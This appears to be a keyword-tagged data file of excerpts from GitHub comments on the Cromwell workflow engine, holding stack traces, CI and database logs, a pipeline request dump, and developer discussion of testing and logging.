org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.WordSpecLike.runTest(WordSpecLike.scala:1088); at org.scalatest.WordSpecLike.runTest$(WordSpecLike.scala:1070); at cromwell.CromwellTestKitWordSpec.runTest(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$runTests$1(WordSpecLike.scala:1147); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(En,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:6559,Test,TestSuite,6559,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,1,['Test'],['TestSuite']
Testability,:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$4(WorkflowFailSlowSpec.scala:30); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.WordSpecLike.runTest(WordSpecLike.scala:1088); at org.scalatest.WordSpecLike.runTest$(WordSpecLike.scala:1070); at cromwell.CromwellTestKitWordSpec.runTest(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$runTests$1(WordSpecLike.scala:1147); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(En,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030:6565,Test,TestSuite,6565,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030,1,['Test'],['TestSuite']
Testability,":59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). #",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:1686,Log,Logger,1686,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532,1,['Log'],['Logger']
Testability,":failOnStderr | test.hello | NULL | 1 | 68934A3E9455FA72420237EB05902327 | 2018-11-21 15:09:37.710000 | string |; | 4735 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | true | 2018-11-21 15:09:09.839000 | boolean |; | 4742 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | false | 2018-11-21 15:09:10.555000 | boolean |; | 4741 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:causedBy[] | test.hello | NULL | 1 | NULL | 2018-11-21 15:09:10.486000 | NULL |; | 4740 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:message | test.hello | NULL | 1 | The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.486000 | string |; | 4739 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:message | test.hello | NULL | 1 | [Attempted 1 time(s)] - NoSuchKeyException: The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.485000 | string |; | 4736 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Hit: 2f58eee9-1b0f-4436-a4ad-48eb305655e9:test.hello:-1 | 2018-11-21 15:09:09.839000 | string |; | 4743 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Miss | 2018-11-21 15:09:10.555000 | string |; | 4759 | 02306258-436a-4372-ab54-2dcd83c42b47 | callRoot | test.hello | NULL | 1 | s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello | 2018-11-21 15:09:10.588000 | string |; | 4762 | 02306258-436a-4372-ab54-2dcd83c42b47 | commandLine | test.hello | NULL | 1 | echo 'Hello World!' > ""helloWorl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029:1372,test,test,1372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029,1,['test'],['test']
Testability,:frowning: Another argument for why we should integration test. Do we need to do a release?. :+1:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/342#issuecomment-166664940:58,test,test,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/342#issuecomment-166664940,1,['test'],['test']
Testability,"; > student knows how to develop a new tool because there are nicely defined; > rules. A good example is to look at the BIDS (brain imaging data structure); > that (has several file formats under it) but it revolutionizing how brain; > imaging analysis is done. (e.g, take a look at https://www.openneuro.org.; > Development of my Thinking; >; > Finally, I want to share how I came to the thinking above. Here are the; > steps that I've taken in the last few weeks, and resulting thoughts from; > them. I started with this issue board actually, and a general goal to ""Add; > Singularity to Cromwell."" Ok.; > Question 1: How do I develop Cromwell?; >; > It first was hard for me to know where to start to develop Cromwell,; > because the docs just went into how to compile it on a host. So it made; > sense to make it easy for the developer to develop Cromwell so I made a; > Dockerfile to do that:; >; > - #4002 <https://github.com/broadinstitute/cromwell/pull/4002>; >; > Woohoo merged! We needed to have tests too, so I followed up on that:; >; > - #4015 <https://github.com/broadinstitute/cromwell/pull/4015>; >; > But unfortunately it was decided that CircleCI was too new / needed to; > learn stuff (this is ok!) so it's going to be closed.; > Question 2: How do we add a Singularity backend?; >; > But this is actually ok, because we realize that we don't need to add; > Singularity to Cromwell proper, it can just be a backend! But I didn't; > understand wdl, or any of the formats, so my crew in Cherry lab gave me a; > solid repo to startwith, and then it started to click!; >; > - vsoch/wgbs-pipeline#1 <https://github.com/vsoch/wgbs-pipeline/pull/1>; >; > I was waiting for the Dockerfile test PR to pass, but realized it probably; > wouldn't, so I jumped on adding the example backend workflows (still; > without totally understanding what/why/how, but figuring out as I went):; >; > - #4039 <https://github.com/broadinstitute/cromwell/pull/4039>; >; > Question 3: But what about Cromwell+",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:10276,test,tests,10276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,2,['test'],['tests']
Testability,; at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$workflowInitializationFailed(MaterializeWorkflowDescriptorActor.scala:211); at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$2.applyOrElse(MaterializeWorkflowDescriptorActor.scala:181); at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$2.applyOrElse(MaterializeWorkflowDescriptorActor.scala:176); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); at akka.actor.FSM.processEvent(FSM.scala:665); at akka.actor.FSM.processEvent$(FSM.scala:662); at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.akka$actor$LoggingFSM$$super$processEvent(MaterializeWorkflowDescriptorActor.scala:136); at akka.actor.LoggingFSM.processEvent(FSM.scala:801); at akka.actor.LoggingFSM.processEvent$(FSM.scala:783); at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.processEvent(MaterializeWorkflowDescriptorActor.scala:136); at akka.actor.FSM.akka$actor$FSM$$processMsg(FSM.scala:659); at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:653); at akka.actor.Actor.aroundReceive(Actor.scala:514); at akka.actor.Actor.aroundReceive$(Actor.scala:512); at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:136); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); at akka.actor.ActorCell.invoke(ActorCell.scala:496); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.di,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406:4410,Log,LoggingFSM,4410,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406,1,['Log'],['LoggingFSM']
Testability,; projectId: broad-firecloud-benchmark; request:; '@type': type.googleapis.com/google.genomics.v1alpha2.RunPipelineRequest; ephemeralPipeline:; docker:; cmd: /bin/bash /cromwell_root/exec.sh; imageName: broadinstitute/broadmutationcalling_beta:benchmark_1; inputParameters:; - name: __extra_config_gcs_path; - localCopy:; disk: local-disk; path: fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; name: mutectMergedRawVCF-0; - localCopy:; disk: local-disk; path: firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; name: VEP_File-0; - localCopy:; disk: local-disk; path: exec.sh; name: exec; name: CallingGroup_Workflow; outputParameters:; - localCopy:; disk: local-disk; path: VEP_Task-rc.txt; name: VEP_Task-rc.txt; - localCopy:; disk: local-disk; path: dstat.log.txt; name: dstat.log.txt; - localCopy:; disk: local-disk; path: df.log.txt; name: df.log.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt; name: variant_effect_output.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt_summary.html; name: variant_effect_output.txt_summary.html; projectId: broad-firecloud-benchmark; resources:; bootDiskSizeGb: 10; disks:; - mountPoint: /cromwell_root; name: local-disk; sizeGb: 31; type: PERSISTENT_HDD; minimumCpuCores: 1; minimumRamGb: 7; zones:; - us-central1-b; - us-central1-c; - us-central1-f; pipelineArgs:; clientId: ''; inputs:; VEP_File-0: gs://firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; __extra_config_gcs_path: gs://cromwell-auth-broad-firecloud-benchmark/04b3f189-18f3-47b3-972c-0e59d2a56174_auth.json; exec: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/exec.sh; mutectMergedRawVCF-0: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/Callin,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:3201,log,log,3201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['log'],['log']
Testability,"<details>; <summary>Example grep'ed output from v2alpha1 test…</summary>; <pre>; 18:57:55.173 [daemonpool-thread-33] INFO centaur.api.CentaurCromwellClient$ - Submitting drs_usa_jdr returned workflow id efe9c9a5-cd24-4c78-b39d-d9f10cc754de; 2020-10-13 18:57:55,443 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - MaterializeWorkflowDescriptorActor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.read_drs_with_usa -> papi-v2-usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa -> papi-v2-usa; 2020-10-13 18:57:57,875 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Starting drs_usa_jdr.read_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa; 2020-10-13 18:57:58,653 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.skip_localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:57,test,test,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335,1,['test'],['test']
Testability,"> 1. It looks like the perf tests were run on version `""cromwellVersion"": ""48-e0cee74-SNAP"",`, but I don't see that hash in the commit history here.; > ; > I just want to check that was the version you were expecting them to run against, since I would expect it to be a `49-...` hash (you presumably had to rebase onto develop to undo all of the not-quite-summarizer-fix changes)?. @cjllanwarne this is the proper version. I actually took your initial `cjl_summarization_queue` branch and made updates in it. Then I built it locally and pushed to my personal Dockerhub.; I only merged develop branch into this one before creating the PR. >I think we could make this process more efficient by only writing the IDs into the summary queue in the first place if we know we'll actually want to summarize them later on. Do you mean write only those IDs which have certain metadata key value? I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584879436:28,test,tests,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584879436,2,['test'],['tests']
Testability,"> 3. I can definitely check it out if you let me know the name of the failing test, otherwise not really sure where to start. I have toggled the flag to get the test failures: https://github.com/broadinstitute/cromwell/actions/runs/9085118759/job/24967675053?pr=7412. Thanks for the help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111138038:78,test,test,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111138038,2,['test'],['test']
Testability,"> > Hmm all the beta builds are failing fauxcalization...; > ; > Hmm, it worked on my machine (c) 🙂; > Probably misconfiguration - will have to check once I'm back. Test was running on the wrong backend. Now passing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5746#issuecomment-678286270:165,Test,Test,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5746#issuecomment-678286270,1,['Test'],['Test']
Testability,"> > I think they are true - I didn't write any tests; > ; > I was hoping there were already some... 😬 Perhaps not as part of this ticket since this seems to be concerned with making the lookup more efficient, but it seems there really should be some Centaur tests for the overall feature. There's actually a Centaur tests which verifies that the whole VPC-thing works, so I guess that might be enough.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5894#issuecomment-700239033:47,test,tests,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5894#issuecomment-700239033,3,['test'],['tests']
Testability,"> > I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria.; > ; > But sooner or later we have to do that anyway on the summarization side (and probably on the order of 99% of metadata doesn't need summarizing). By doing it before we write to the DB, I think we could avoid:; > ; > 1. Writing the entries we know don't need to be summarized to the summarization queue.; > 2. Reading the non-summarizable metadata _value_s from the database into Cromwell (and some of them are pretty big) - only to discard them when we read the key and discover it's not summarizable. I'm still reluctant to do that:; 1. Yes, but writing a single additional number per entry to a summary table is not nearly a huge overhead, taking into attention that, as you said, in the same transaction we are writing some huge metadata entries into the `metadata_entry` table.; 2. Summarizer works asynchronously and though I agree that we should keep it's performance good enough, moving metadata key filtering logic to the ""write-metadata-entry"" side of things may affect performance of running workflows.; > Reading the non-summarizable metadata _value_s from the database into Cromwell. Also, if my understanding is correct, this is how summarizer works right now. There are other possible things which we can do to optimize summarizer performance, one of which would be to add additional `metadata_key` column to our new queue table, and then allow summarizer to decide if it wants to fetch data from `metadata_entry` table based on that key. But this is food for thought for future optimizations.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-585322534:1062,log,logic,1062,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-585322534,1,['log'],['logic']
Testability,"> > Looks very promising! 😄; > > I would ask that all commented out code be removed in the final version of the PR (if it's part of work-in-progress that's totally fine).; > > I applied these changes to a branch in the Cromwell repo and ran our Centaur CI. There were several test failures, logs are available here: https://travis-ci.com/broadinstitute/cromwell/jobs/202934788; > ; > Thanks for your review!; > In this PR, BCS started to use the runtime `docker` which only supports AlibabaCloud Container Registry, so in the failed cases, docker image `ubuntu:latest` from dockerhub is not supported. In order to fix it, we need to provide your test account in us-east-1 region a new ECS image which contains a local `ubuntu:latest` docker image, and next week will be ok. We have provided a new custom ECS image with local `ubuntu:latest` docker image(`src/ci/bin/test_bcs.inc.sh`). Please run Centaur CI for a new test. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-499071308:276,test,test,276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-499071308,4,"['log', 'test']","['logs', 'test']"
Testability,"> > Might be tricky to stage but it'd be really nice to see tests for:; > > ; > > * A file whose crc32c has changed since we created the manifest; > > * A file which isn't on the image even though the manifest lists it; > ; > These tests may be not required if we use versioned images. Added this topic to today's techtalk agenda. Per techtalk discussion, disk image versioning is not the answer to this problem, but this ticket is: https://broadworkbench.atlassian.net/browse/BA-6577",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5746#issuecomment-678360814:60,test,tests,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5746#issuecomment-678360814,2,['test'],['tests']
Testability,"> @grsterin @aednichols if not an adapter from the old config, I do think a stub which throws an exception saying ""you need to update your config"" or something similar would be better than users suddenly getting cryptic errors like `""Class not found: x.y.z""`. Since it has been decided to keep support for older v2alpha1 version in addition to newer v2beta, this is no longer an issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-580044147:76,stub,stub,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-580044147,1,['stub'],['stub']
Testability,> @kpierre13 these tests cases look great. Would it also make sense to add tests for below endpoints? Or do tests for these already exist?; > ; > * GET `/runs/{workflowId}/status`; > * POST `/runs/{workflowId}/cancel`; > * GET `/service-info`. There are existing tests for the first two in the same file. The tests for `service-info` are located in [ServiceInfo.spec](https://github.com/broadinstitute/cromwell/blob/21fc23f41b776d666a089b7c83b64a066bc730e8/engine/src/test/scala/cromwell/webservice/routes/wes/ServiceInfoSpec.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096:19,test,tests,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6833#issuecomment-1219887096,6,['test'],"['test', 'tests']"
Testability,"> @markjschreiber looks like we found your flakey test. Yes, this one has been failing for me a lot",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5471#issuecomment-607263047:50,test,test,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5471#issuecomment-607263047,1,['test'],['test']
Testability,"> @pshapiro4broad just want to be sure you'll be adding the Centaur tests?. It turned out that we (green) didn't need this feature after all, and I've been a bit busy to run the required test. Maybe a red person could take this over, as I think it may be generally useful for other users?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-465747227:68,test,tests,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-465747227,2,['test'],"['test', 'tests']"
Testability,"> A couple of other observations:; > ; > 1. Re-running failures seems to be better with CircleCI. If you click through to the details, you can invoke ""Rerun Workflow from Failed"" to skip re-running tests that succeeded. I like that a bit less, since in Travis, if one of the subbuilds failed after 1 second, you can independently restart it immediately. But in CircleCI you would need to wait for all subbuilds to finish in order for it to let you restart the failed onces.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778286564:198,test,tests,198,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778286564,1,['test'],['tests']
Testability,"> Actually I'd like to add a Centaur integration test for this, I can hopefully get this done today. Thanks, I thought about doing this but wasn't sure how to do it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5103#issuecomment-518663198:49,test,test,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5103#issuecomment-518663198,1,['test'],['test']
Testability,"> All of the code which went into engine retained cromwell as the package instead of cromwell.engine, which causes IntelliJ to whine. I thought it'd be weird as there is a cromwell.engine package already (cromwell.engine.engine?). I'm still trying to understand that statement in the context of what I'm seeing in diff/intellij. I'm especially not sure about the particular IntelliJ ""whine"". If it's about the packages being incorrect in all the files, that warning is because there's a missing ""cromwell"" directory in the file paths.; - engine/src/main/scala/{ => cromwell}/*; - engine/src/test/scala/{ => cromwell}/*",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/527#issuecomment-194383402:591,test,test,591,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/527#issuecomment-194383402,1,['test'],['test']
Testability,"> All of these changes look great but I'm a bit uncertain how they've enabled Jenkins CRON. The 279 changes in `test.inc.sh`, especially those near `${CROMWELL_BUILD_PROVIDER_JENKINS}`,; are the heart of Jenkins support. As of v33 that file contains all of the the local/Travis/Jenkins (and later CircleCI) business logic. It was consolidated from code copy/pasted around the various `test*.sh` scripts in the past. > 279 src/bin/ci/test.inc.sh → src/ci/bin/test.inc.sh; > Large diffs are not rendered by default. If you haven't already click to expand the diff and scroll through the changes/cleanup. Also happy to review IRL. Many of the changes in other files are just ripples.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3853#issuecomment-402268184:112,test,test,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3853#issuecomment-402268184,5,"['log', 'test']","['logic', 'test']"
Testability,"> Also I'm not the ticket author but I thought that was intended to cover integrating ""compressed at rest"" writes into carboniting?. oops, accidentally reverted that part during testing",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5269#issuecomment-551225460:178,test,testing,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5269#issuecomment-551225460,1,['test'],['testing']
Testability,"> Also have this error, using Cromwell 52, installed using this manual :; > ; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > ; > logs say : fetch_and_run.is is a directory. Extra info : cloning job & resubmitting through aws console runs fine. so it seems to be a temporary issue",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-747603613:190,log,logs,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-747603613,1,['log'],['logs']
Testability,"> Are there any metrics we can add to look out in advance for disadvantaged users?. @cjllanwarne my comment was a bit terse but it refers to the old code that was having test issues, this current PR will not have disadvantaged users.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068440709:170,test,test,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068440709,1,['test'],['test']
Testability,> Bunting on review because it looks like we are adding the test in #5408. ![](http://www.vintagebluebird.co.uk/images/srv/calendar/Ashbourne/Ashbourne_Bunting_view_to_Church.jpg),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5406#issuecomment-584758749:60,test,test,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5406#issuecomment-584758749,1,['test'],['test']
